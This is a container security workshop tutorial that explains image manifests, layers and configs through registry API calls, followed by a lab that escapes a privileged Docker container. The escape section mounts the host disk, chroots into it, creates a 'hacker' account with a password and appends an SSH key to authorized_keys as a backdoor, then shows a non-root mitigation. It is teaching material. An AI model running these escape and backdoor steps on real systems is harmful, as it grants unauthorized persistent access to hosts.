# Container Security 201

Welcome to my Container Security 201 workshop!

If you haven't already, I recommend starting with my [Container Security 101 lab](container-security-101).

Now that you have an initial familiarity with containers and standard container security controls, we're going to dig in further to see how registries and
runtimes actually work.

## Agenda

```{toctree}
---
caption: Agenda
maxdepth: 1
---
```

1. [Dig into the container image manifests, layers, and configurations](container-image-components)
1. [Break out of a misconfigured container](ready-set-break)

## Getting started

```{important}
This lab expects that you have an AWS Cloud9 environment configured. Step by step instructions to create a Cloud9 environment are available
<a href="../ref/aws_cloud9.html" target="_blank" rel="noopener">here</a>.
```

Run the following inside your Cloud9 IDE to setup the lab environment:

<!-- This is a hidden reference config used for testing; it must be valid JSON -->
<div class="testConfig" style="display: none;">
  { "cloud9_instance_type": "t3.large" }
</div>

```{code-block} bash
---
class: getting-started
---
docker run --network host -v /:/host jonzeolla/labs:container-security-201
```

You're now ready to get started on the lab!

## Terminology

This may be a reminder if you've went through the [Container Security 101 lab](container-security-101), but I find it takes a bit of repetition to really stick,
so I suggest reviewing it again either way.

- **Image**: An image is a bundle of configuration, metadata, and files in a structured format. When you want to run a container, you take an image and
  "instantiate" (run) it.
- **Container**: A container is lightweight bundle of software that includes everything needed to run an application. When you run `docker run nginx`, you are
  taking the image `nginx` and creating a running container from it. When that happens, a process or set of processes are started, and a filesystem is setup.
  Ultimately, containers are just processes running on your host with a set of restrictions.
- **OCI Artifact**: In the container ecosystem, there is a standard called the _Open Container Initiative_ or OCI. It describes various specifications regarding
  [images](https://github.com/opencontainers/image-spec), [runtimes](https://github.com/opencontainers/runtime-spec), and [distributing
  images](https://github.com/opencontainers/distribution-spec). You don't need to worry about the details for this lab, just know that an OCI Artifact is a
  bundle of files that conforms to the OCI standards.
- **Container Runtime**: Container runtimes are software components that facilitate running containers on a host operating system. In this lab we're going to
  use `docker` as our container runtime; while there are alternatives, this is the most widely adopted containerization software and simplest place to start.

## Environment Review

After running the `jonzeolla/labs:container-security-201` docker image above, your environment was configured with some running dependencies. Let's take a look
at what was created.

## Container image components

Alright, now it's time to get a little bit ... deeper.

So far we've covered a little bit about docker images and OCI artifacts, but what exactly _is_ an image?

You may remember from our [terminology](terminology) section that an image is a bundle of configuration, metadata, and
files in a structured format.

That bundle can be uniquely identified using an image manifest digest, which is just another name for the digest we've
been using all along. Here you can retrieve the manifest digest and use it to make API calls to the registry:

```{code-block} console
---
emphasize-lines: 3,5,7
---
$ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' example | cut -f2 -d@)
$ echo $mdigest
sha256:63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c
$ curl -k https://localhost:443/v2/example/tags/list
{"name":"example","tags":["sha256-63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c.sig","latest"]}
$ curl -s -k https://localhost:443/v2/example/manifests/$mdigest | sha256sum
63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c  -
$ curl -s -k https://localhost:443/v2/example/manifests/$mdigest | head -14
{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {
      "mediaType": "application/vnd.docker.container.image.v1+json",
      "size": 7705,
      "digest": "sha256:6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14"
   },
   "layers": [
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 31418228,
         "digest": "sha256:26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405"
      },
```

Note that the digest is the same on each of the above highlighted lines, even the one that is the result of a
`sha256sum`, showing that it is a content addressable store. That is, the contents of the data returned by the API are
the same as its SHA-256 sum.

You can repeat this same sort of approach for the other two key components of an image; let's look at the first file
system layer first:

```{code-block} console
---
emphasize-lines: 9-18
---
$ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' example | cut -f2 -d@)
$ ldigest=$(curl -s -k https://localhost:443/v2/example/manifests/$mdigest | jq -r '.layers[0].digest')
$ echo $ldigest
sha256:26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405
$ curl -s -k https://localhost:443/v2/example/blobs/$ldigest | sha256sum
26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405  -
$ curl -s -k https://localhost:443/v2/example/blobs/$ldigest | tar -tvzf - > image_filesystem
$ head image_filesystem
lrwxrwxrwx 0/0               0 2023-11-20 00:00 bin -> usr/bin
drwxr-xr-x 0/0               0 2023-09-29 20:04 boot/
drwxr-xr-x 0/0               0 2023-11-20 00:00 dev/
drwxr-xr-x 0/0               0 2023-11-20 00:00 etc/
-rw------- 0/0               0 2023-11-20 00:00 etc/.pwd.lock
-rw-r--r-- 0/0            3040 2023-05-25 15:54 etc/adduser.conf
drwxr-xr-x 0/0               0 2023-11-20 00:00 etc/alternatives/
-rw-r--r-- 0/0             100 2023-05-11 02:04 etc/alternatives/README
lrwxrwxrwx 0/0               0 2022-06-17 15:35 etc/alternatives/awk -> /usr/bin/mawk
lrwxrwxrwx 0/0               0 2022-06-17 15:35 etc/alternatives/awk.1.gz -> /usr/share/man/man1/mawk.1.gz
```

What's particularly notable here is that we can actually start to investigate the files that are in this layer!

Now, why is it called a layer? Well, the filesystem for images is built on something called the Union filesystem, or
Unionfs. It allows us to have multiple different bundles of files (layers) which are then iteratively decompressed on
top of each other when you run a container to then create the final, merged filesystem that you actually see at runtime.

This also means that, just because a file has a certain set of contents at runtime doesn't mean that's the _only_
version of that file in the image. You may find a different file in a prior layer that was overwritten by the newer
layer.

This is where we can encounter security issues. These files become "hidden" at runtime, but they are very much available
in the image itself, if you know where to look, and sometimes they can contain sensitive information such as passwords
or keys.

Okay, let's move onto the third and final component of an image, the configuration!

```{code-block} console
---
emphasize-lines: 8-11,13-17
---
$ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' example | cut -f2 -d@)
$ cdigest=$(curl -s -k https://localhost:443/v2/example/manifests/$mdigest | jq -r '.config.digest')
$ echo $cdigest
sha256:6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14
$ curl -s -k https://localhost:443/v2/example/blobs/$cdigest | sha256sum
6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14  -
$ curl -s -k https://localhost:443/v2/example/blobs/$cdigest | jq -r '.config.Env[]'
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NGINX_VERSION=1.23.4
NJS_VERSION=0.7.11
PKG_RELEASE=1~bullseye
$ curl -s -k https://localhost:443/v2/example/blobs/$cdigest | jq -r '.history[16]'
{
  "created": "2023-04-26T00:50:44.615696269Z",
  "created_by": "RUN /bin/sh -c groupadd --gid 53150 -r notroot && useradd -r -g notroot -s \"/bin/bash\" --create-home --uid 53150 notroot # buildkit",
  "comment": "buildkit.dockerfile.v0"
}
```

Just like with the layers, we can see some very interesting information by dissecting an image configuration. In the
highlighted lines above we see the environment variables that this image has configured, as well as some of the
historical steps taken at build time. Specifically, I am showing the user creation step from earlier in the lab.

This information is available to anybody who can pull the image, and is another place where you may find sensitive
information exposed unintentionally. For instance, was a secret passed in at build time and used to pull code from your
internal repositories? Or perhaps a secret is needed at runtime to decrypt some files and it's stored as an environment
variable. Both of those are easily exposed to anybody with read access.

The real solution here is to avoid secrets from being stored in your images in the first place. While there are many
reasonable approaches to prevent this, I highly recommend [multi-stage
builds](https://docs.docker.com/build/building/multi-stage/) and providing secrets at build time safely using
[environment variables](https://github.com/moby/buildkit/pull/1534), and dynamically retrieving sensitive information at
runtime via integrations with secrets stores like [HashiCorp Vault](https://www.vaultproject.io/), [AWS Secrets
Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html), etc.

```{note}
As a brief aside, if using `curl` to custom-create API queries isn't your thing, but you still need to take a peek under
the covers from time to time, I recommend using
[`crane`](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md).
```

```{seealso}
Want more like the above? Well, to start I recommend checking out
[this](https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/) incredibly
interesting blog post about how OCI images can be modified to track when it's pulled, and anything online from a group
that calls themselves SIG-Honk.

Also, keep an eye out for additional labs by myself in the future 😉
```

## Ready, Set, Break!

Alright, now it's time for our last section, a container escape.

We'll start by running a standard Ubuntu container with some additional privileges which are sometimes used when trying
to troubleshoot permissions issues:

```{code-block} console
---
class: skip-tests
---
$ docker run -it -e HOME --privileged ubuntu:24.04
Unable to find image 'ubuntu:24.04' locally
24.04: Pulling from library/ubuntu
fdcaa7e87498: Pull complete
Digest: sha256:562456a05a0dbd62a671c1854868862a4687bf979a96d48ae8e766642cd911e8
Status: Downloaded newer image for ubuntu:24.04
```

Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
example is on `/dev/nvme0n1p1`:

```{code-block} console
---
class: skip-tests
emphasize-lines: 5-7
---
$ mount | grep '/dev/'
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime,seclabel)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,seclabel,size=65536k)
/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=666)
$ ls -al /home # Nothing in the home directory in the container
total 0
drwxr-xr-x. 3 root   root   20 Apr 23 15:31 .
drwxr-xr-x. 1 root   root    6 May  1 00:59 ..
drwxr-x---. 2 ubuntu ubuntu 57 Apr 23 15:31 ubuntu
$ mount /dev/nvme0n1p1 /mnt
$ chroot /mnt
```

Now that we've `chroot`ed into that filesystem, we are effectively on the host computer. Let's see see if we can find
anything juicy, and maybe drop a quick backdoor for ourselves later:

```{code-block} console
---
emphasize-lines: 1
class: skip-tests
---
$ ls -al /home # We can now see /home/ on the host filesystem
total 16
drwxr-xr-x.  3 root     root        22 Apr 24 12:05 .
dr-xr-xr-x. 18 root     root       237 Apr 11 20:37 ..
drwx------. 16 ec2-user ec2-user 16384 Apr 30 23:39 ec2-user
$ useradd hacker
$ echo 'hacker:newpassword' | chpasswd
```

Finally, let's drop our public key into the current user's `~/.ssh/authorized_keys` file so there's another way back in.

```{code-block} bash
---
class: skip-tests
---
echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> ${HOME}/.ssh/authorized_keys
exit
exit
```

Back on the host, we can see evidence of the break-in:

```{code-block} console
---
class: skip-tests
---
$ tail -3 /etc/passwd
nginx:x:991:991:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
hacker:x:1001:1001::/home/hacker:/bin/bash
$ tail -1 "${HOME}/.ssh/authorized_keys"
ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor
```

### Fix

How do we prevent these sort of issues? Specific to this breakout, even if we continue to allow `--privileged`, we can
mitigate some of the impact by requiring that non-root users be used at runtime. For instance:

```{code-block} bash
---
class: skip-tests
---
docker run -it -u 1001 --privileged ubuntu:24.04
```

Now when we go to mount the host filesystem or run `chroot`, we get an error:

```{code-block} console
---
emphasize-lines: 14
class: skip-tests
---
$ mount | grep '/dev/'
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime,seclabel)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,seclabel,size=65536k)
/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,sunit=1024,swidth=1024,noquota)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=666)
$ ls -al /home
total 0
drwxr-xr-x. 3 root   root   20 Apr 23 15:31 .
drwxr-xr-x. 1 root   root    6 May  1 01:00 ..
drwxr-x---. 2 ubuntu ubuntu 57 Apr 23 15:31 ubuntu
$ mount /dev/nvme0n1p1 /mnt
mount: /mnt: must be superuser to use mount.
       dmesg(1) may have more information after failed mount system call.
$ chroot /mnt
chroot: cannot change root directory to '/mnt': Operation not permitted
$ exit
```

Breakout averted! Great job 😊

```{seealso}
---
class: dropdown
---
Interested in some more ways to escape a container? Check out Panoptica's "[7 Ways to Escape a
Container](https://www.panoptica.app/research/7-ways-to-escape-a-container)" blog post, which covers:
  1. Mounting the host filesystem
  1. Using a mounted docker socket
  1. Project Injection
  1. Adding a malicious kernel module
  1. Reading secrets from the host
  1. Overriding files on the host
  1. Abusing notify on release
```


## Conclusion

If you've made it this far, congratulations!

Have any ideas or feedback on this lab? Connect with me [on LinkedIn](https://linkedin.com/in/jonzeolla/) and send me a
message.

If you'd like more content like this, check out SANS [SEC540 class](http://sans.org/sec540) for 5 full days of Cloud
Security and DevSecOps training.

## Cleanup

Don't forget to clean up your Cloud9 environment! Deleting the environment will terminate the EC2 instance as well.
